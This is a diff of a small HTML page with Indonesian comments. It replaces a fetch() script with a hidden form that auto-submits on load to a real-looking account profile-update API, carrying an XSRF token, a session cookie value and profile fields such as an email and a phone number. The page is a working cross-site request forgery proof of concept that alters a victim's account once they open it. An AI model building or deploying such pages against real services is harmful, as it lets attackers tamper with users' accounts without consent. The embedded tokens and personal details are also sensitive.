@@ -1,48 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Auto Submit ke API</title>
+  <title>Auto Submit</title>
 </head>
-<body>
-  <script>
-    // Data yang akan dikirim ke API
-    const data = {
-      full_name: "John Wickk",
-      gender: "male",
-      dob: "22/01/2025",
-      email: "yaliyanto21@yahoo.co.id",
-      phone: "08098098908",
-      identity_number: "demosouthgate@lingkup.co",
-      department: "",
-      role_id: "",
-      ktp: "",
-      staff_id: "undefined"
-    };
-
-    // Token dan session dari cookie biasanya harus didapat dari browser yang sudah login
-    const xsrfToken = "eyJpdiI6Im5wUE5CSm9aQUdadlYyeDdMUkZkWGc9PSIsInZhbHVlIjoiYT..."; // Ganti dengan token asli
-    const productionSession = "eyJpdiI6IkNBWDdCTlhhMXZObDcrVnVCWkVHWFE9PSIsInZhbHVlIjoiS3..."; // Ganti dengan session asli
-
-    // Fungsi auto-submit
-    fetch("https://app.lingkup.co:443/api/v1/cms/account/updateprofile", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "X-XSRF-TOKEN": xsrfToken,
-        "Cookie": `production_session=${productionSession}` // ini biasanya tidak bisa diset manual dari JS karena CORS
-      },
-      credentials: "include", // ini penting agar cookie dikirim (kalau CORS dan server mengizinkan)
-      body: JSON.stringify(data)
-    })
-    .then(res => res.json())
-    .then(response => {
-      console.log("Sukses:", response);
-      alert("Permintaan berhasil!");
-    })
-    .catch(error => {
-      console.error("Gagal:", error);
-      alert("Terjadi kesalahan, lihat console log");
-    });
-  </script>
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="https://app.lingkup.co:443/api/v1/cms/account/updateprofile">
+    <input type="hidden" name="XSRF-TOKEN" value="eyJpdiI6Im5wUE5CSm9aQUdadlYyeDdMUkZkWGc9PSIsInZhbHVlIjoiYTNyelVwejhReHA3NWZIVnRMcnpyRGpK...">
+    <input type="hidden" name="production_session" value="eyJpdiI6IkNBWDdCTlhhMXZObDcrVnVCWkVHWFE9PSIsInZhbHVlIjoiS3Fzckorc2k1Z3Er...">
+    <input type="hidden" name="full_name" value="John Wickk">
+    <input type="hidden" name="gender" value="male">
+    <input type="hidden" name="dob" value="22/01/2025">
+    <input type="hidden" name="email" value="yaliyanto21@yahoo.co.id">
+    <input type="hidden" name="phone" value="08098098908">
+    <input type="hidden" name="identity_number" value="demosouthgate@lingkup.co">
+    <input type="hidden" name="department" value="">
+    <input type="hidden" name="role_id" value="">
+    <input type="hidden" name="ktp" value="">
+    <input type="hidden" name="staff_id" value="undefined">
+    <input type="submit" value="Send">
+  </form>
 </body>
 </html>
